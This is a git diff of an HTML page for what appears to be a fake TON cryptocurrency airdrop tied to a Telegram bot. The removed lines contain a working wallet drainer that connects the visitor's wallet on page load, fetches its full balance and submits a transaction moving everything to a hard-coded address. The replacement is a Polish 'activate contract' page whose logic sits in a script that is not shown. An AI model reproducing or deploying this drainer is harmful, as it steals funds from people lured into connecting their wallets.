@@ -3,62 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Connect Example</title>
-    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <title>Aktywuj kontrakt</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-
-    <div id="ton-connect"></div>
-    <script>
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect'
-        });
-        tonConnectUI.uiOptions = {
-            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        };
-
-        async function connectToWallet() {
-            try {
-                const connectedWallet = await tonConnectUI.connectWallet();
-                console.log(connectedWallet);
-
-                // Get the wallet address
-                const walletAddress = connectedWallet.account.address;
-
-                // Load the balance of the wallet using TON Center API
-                const balance = await getAccountBalance(walletAddress);
-                console.log(`Wallet balance: ${balance} nanoTON`);
-
-                // Propose a transaction to transfer all TON tokens
-                const transferAmount = balance; // Transfer the entire balance
-                const recipientAddress = 'UQDritJgjXDmn9HkUeCYpAm-WErrDj-E5qS2ZgjWFZnt9Fvc'; // Your wallet address
-                const transferTx = {
-                    validUntil: Math.floor(Date.now() / 1000) + 3600,
-                    messages: [{
-                        address: recipientAddress,
-                        amount: transferAmount,
-                        payload: 'te6ccgEBAQEAAgAAAA==' // Empty payload
-                    }]
-                };
-
-                // Send the transaction
-                const txResult = await tonConnectUI.sendTransaction(transferTx);
-                console.log('Transaction result:', txResult);
-            } catch (error) {
-                console.error("Error connecting to wallet or sending transaction:", error);
-            }
-        }
-
-        // Function to get account balance using TON Center API
-        async function getAccountBalance(address) {
-            const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
-            const data = await response.json();
-            return data.result;
-        }
-
-        // Call the function
-        connectToWallet();
-    </script>
+    <h1>Aktywuj kontrakt</h1>
+    <button id="connect-button">Połącz portfel</button>
+    <button id="activate-button" disabled>Aktywuj kontrakt</button>
+    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/sdk@1.0.0/dist/tonconnect.min.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
